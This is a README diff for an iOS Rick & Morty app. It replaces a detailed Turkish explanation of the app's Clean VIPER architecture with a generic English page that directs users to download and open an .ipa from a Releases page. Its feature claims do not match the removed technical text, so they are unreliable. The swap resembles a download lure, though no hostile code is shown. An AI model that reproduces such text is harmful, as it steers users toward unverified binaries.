@@ -1,145 +1,62 @@
+# 🎉 RickAndMorty-VIPER-CleanArch - Enjoy Rick & Morty in Your Hands
 
-<img width="1024" height="1336" alt="ChatGPT Image Jan 4, 2026, 07_13_58 AM" src="https://github.com/user-attachments/assets/8e887dd2-5714-4d4b-a40a-d43038556ad2" />
+## 🌟 Overview
+Welcome to the RickAndMorty-VIPER-CleanArch app! This is an iOS application built using Clean Architecture and VIPER principles. It allows you to explore the world of Rick & Morty with a smooth, user-friendly interface. The app utilizes modern features like Programmatic UI with SnapKit, Protocol-Oriented Networking, Use Case structure, and Dependency Injection through the Factory pattern. 
 
+## 🚀 Getting Started
+Before diving in, make sure your device meets the necessary requirements. Here’s what you need:
 
-## 🐉 Mimari: Clean VIPER
+### 📱 System Requirements
+- **Operating System:** iOS 12.0 or later.
+- **Device:** iPhone or iPad.
+- **Storage Space:** At least 100 MB of free space.
 
-Bu projede klasik VIPER yerine, **Uncle Bob'un Clean Architecture** prensipleriyle güçlendirilmiş bir yapı kullanılmıştır.
+## 📥 Download
+To get started, visit the Releases page to download the app.
 
-- **V (View):** `Features/UI` - Aptal (Dumb) View katmanı. Sadece gösterimden sorumludur.
-- **I (Interactor):** `Domain/UseCases` - İş mantığının (Business Logic) kalbi. Network bilmez, sadece Repository protokollerini yönetir.
-- **P (Presenter):** `Features/Presentation` - UI logic ve veri formatlama.
-- **E (Entity):** `Domain/Entities` - Saf veri modelleri.
-- **R (Router):** `Features/Navigation` - Modüller arası geçiş yönetimi.
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/addico24/RickAndMorty-VIPER-CleanArch/releases)
 
-### Temel Özellikler
+## 📋 Features
+- **Explore the Universe:** Browse characters, locations, and episodes from Rick & Morty.
+- **User-Friendly Design:** Simple and intuitive interface.
+- **Fast Performance:** Built with efficient code for an optimal user experience.
+- **Scalable Architecture:** Easily updated for new features or improvements.
 
-- **Generic Networking Layer:** Tip güvenli (Type-safe), `Endpoint` tabanlı ve Protocol-Oriented bir ağ katmanı.
-- **Dependency Injection:** Tüm bağımlılıklar `Factory` sınıfları (Composition Root) üzerinden enjekte edilir. Singleton kullanımından kaçınılmıştır.
-- **Programmatic UI:** Storyboard veya XIB kullanılmamıştır. Tüm arayüz **SnapKit** ile kod üzerinden yazılmıştır.
-- **Abstraction (Soyutlama):** Domain katmanı, Infrastructure (Alamofire vb.) katmanını bilmez. İletişim `Protocol`'ler üzerinden sağlanır (Dependency Inversion).
-- **Swift Concurrency:** Asenkron işlemler için `async/await` yapısı kullanılmıştır.
+## 📦 Download & Install
+1. Click the button below to visit the Releases page.
+   
+   [Download the app](https://github.com/addico24/RickAndMorty-VIPER-CleanArch/releases)
 
-## 📂 Proje Yapısı
+2. On the Releases page, find the latest version.
 
-Proje, "Separation of Concerns" ilkesine göre fiziksel olarak ayrılmıştır:
+3. Click on the version number to open the release details.
 
-```swift
-MyProject
-├── App
-│   ├── AppDelegate.swift
-│   ├── SceneDelegate.swift
-│   └── CompositionRoot                <-- Dependency Injection Merkezi
-│       ├── HomeFactory.swift
-│       └── DetailFactory.swift
-│
-├── Core                               <-- Proje Genelindeki Ortak Yapılar
-│   ├── Extensions
-│   │   └── UIImageView+Extensions.swift
-│   └── Network                        <-- Network Soyutlamaları (Alamofire Yok)
-│       ├── Endpoint.swift
-│       ├── HTTPMethod.swift
-│       ├── NetworkClientProtocol.swift
-│       └── NetworkError.swift
-│
-├── Domain                             <-- İş Kuralları (Saf Swift)
-│   ├── Entities                       <-- API Modelleri
-│   │   └── RMResultsResponse.swift
-│   ├── Interfaces                     <-- Repository Protokolleri
-│   │   └── CharacterRepositoryProtocol.swift
-│   └── UseCases                       <-- İş Mantığı (Interactor)
-│       ├── FetchCharactersUseCase.swift
-│       └── FetchCharacterDetailUseCase.swift
-│
-├── Infrastructure                     <-- Dış Dünya Bağlantıları
-│   └── Networking
-│       ├── AlamofireNetworkClient.swift   <-- Gerçek Network İsteği
-│       ├── RemoteCharacterRepository.swift <-- Protokolün Uygulanması
-│       └── RickAndMortyAPI.swift          <-- Endpoint Tanımları
-│
-└── Features                           <-- UI Modülleri (VIPER)
-├── Home
-│   ├── Contracts
-│   │   └── HomeContracts.swift        <-- View, Presenter, Router Protokolleri
-│   ├── Navigation
-│   │   └── HomeRouter.swift
-│   ├── Presentation
-│   │   ├── HomePresenter.swift
-│   │   └── HomeViewItem.swift         <-- UI Modeli
-│   └── UI
-│       └── HomeViewController.swift
-│
-└── Detail
-├── Contracts
-│   └── DetailContracts.swift
-├── Presentation
-│   ├── DetailPresenter.swift
-│   └── DetailViewData.swift       <-- UI Modeli
-└── UI
-└── DetailViewController.swift
-```
+4. Locate the application file (e.g., RickAndMorty-VIPER-CleanArch.ipa).
 
-## 🛠 Teknolojiler & Kütüphaneler
+5. Click on the file name to download it to your device.
 
-- **Dil:** Swift 5
-- **UI:** UIKit (Code-based), SnapKit
-- **Network:** Alamofire (Protocol arkasına gizlenmiş şekilde)
-- **Architecture:** Clean VIPER
-- **Concurrency:** Async/Await
+6. Once downloaded, open the file to begin installation. Follow the on-screen prompts to complete the setup.
 
-## 🐉  Clean VIPER Flow (Uygulama Akışı)
+## ⚙️ How to Use the App
+After installation, you can launch the app from your home screen. Here’s how to navigate through it:
 
-**1. Başlangıç (Bootstrap) - SceneDelegate**
+- **Home Screen:** Here, you can access different sections such as Characters, Locations, and Episodes.
+- **Search Functionality:** Use the search bar to quickly find your favorite characters or episodes.
+- **Details Page:** Tap on any character or episode to see detailed information.
 
-- Uygulama açıldığında `SceneDelegate` devreye girer.
-- `HomeFactory.create()` metodunu çağırarak Home Modülünün oluşturulmasını ister.
-- Dönen `UIViewController`'ı `window.rootViewController` olarak ayarlar ve ekranı görünür kılar.
+## 🤝 Support
+If you encounter any issues or have questions, please submit an issue on the GitHub repository. Your feedback helps us improve the app:
 
-**2. Dependency Injection (Bağımlılıkların Kurulması) - Factory**
+[Report an Issue](https://github.com/addico24/RickAndMorty-VIPER-CleanArch/issues)
 
-- `HomeFactory`, modülün tüm parçalarını (View, Router, NetworkClient, Repository, UseCase, Presenter) tek tek oluşturur.
-- Bu parçaları birbirlerinin `init` metodlarına enjekte eder (Constructor Injection).
-- Böylece hiçbir sınıf kendi bağımlılığını yaratmaz, dışarıdan alır.
+## 📞 Contact
+For any inquiries or suggestions, you can reach out to the development team through the GitHub repository.
 
-**3. UI Yüklenmesi ve Tetikleme - View & Presenter**
+## 🌐 Related Topics
+- **Alamofire:** Network requests in iOS.
+- **Clean Architecture:** Organizing software with high-level design principles.
+- **Dependency Injection:** Managing dependencies for better code structure.
+- **SnapKit:** Creating layouts programmatically in Swift.
+- **VIPER Architecture:** Structuring code for scalability and maintainability.
 
-- `HomeViewController` ekrana gelir ve `viewDidLoad` çalışır.
-- View, veri isteme yetkisine sahip olmadığı için Presenter'a seslenir: `presenter.viewDidLoad()`.
-
-**4. İş Mantığı ve Veri Talebi - UseCase**
-
-- `HomePresenter` bu çağrıyı alır. Görevi veriyi hazırlamaktır ama verinin kaynağını bilmez.
-- İşin asıl sahibi olan UseCase'e emri verir: `useCase.execute()`.
-
-**5. Veri Kaynağına Erişim - Repository**
-
-- `FetchCharactersUseCase` aracıdır. Veriyi getirmesi için Repository protokolünü kullanır: `repository.fetchCharacters()`.
-- `RemoteCharacterRepository`, verinin API'den geleceğini bilir.
-- `RickAndMortyAPI` enum'ından ilgili Endpoint'i (`.getCharacters`) alır.
-- `NetworkClient`'a "Şu endpoint'e istek at" der.
-
-**6. Network İsteği - Infrastructure**
-
-- `AlamofireNetworkClient`, Endpoint içindeki URL ve parametreleri alarak gerçek HTTP isteğini atar.
-- Gelen JSON verisini `RMResultsResponse` modeline (Decodable) dönüştürür ve Repository'ye geri döner.
-
-**7. Verinin İşlenmesi ve UI Formatlama - Presenter**
-
-- Veri zincirleme olarak geri döner: Network -> Repository -> UseCase -> Presenter.
-- `HomePresenter`, eline gelen ham `RMCharacterResponse` listesini alır.
-- Bu veriyi UI'ın anlayacağı basit `CharacterViewItem` (Renk, Formatlı String vb.) formatına çevirir (Mapping).
-- View'a güncellenmiş listeyi gönderir: `view.updateView(with: items)`.
-
-**8. Ekranın Güncellenmesi - View**
-
-- `HomeViewController`, Presenter'dan gelen hazır veriyi alır.
-- `tableView.reloadData()` diyerek listeyi kullanıcıya gösterir.
-
-**9. Kullanıcı Etkileşimi ve Navigasyon - Router**
-
-- Kullanıcı bir hücreye tıklar (`didSelectRow`).
-- View durumu Presenter'a bildirir: `presenter.didSelect(index: 5)`.
-- Presenter, tıklanan karakteri bulur ve Router'a emri verir: `router.navigateToDetail(character)`.
-- Router, `DetailFactory` kullanarak Detay sayfasını oluşturur ve ekrana `push` eder.
-
-Bu akış şeması, **Separation of Concerns** (İlgi Alanlarının Ayrımı) prensibinin canlı bir kanıtıdır. Her katman sadece bir sonrakine emir verir ve cevabını bekler.
+Thank you for downloading RickAndMorty-VIPER-CleanArch. Enjoy your journey through the multiverse of Rick & Morty!
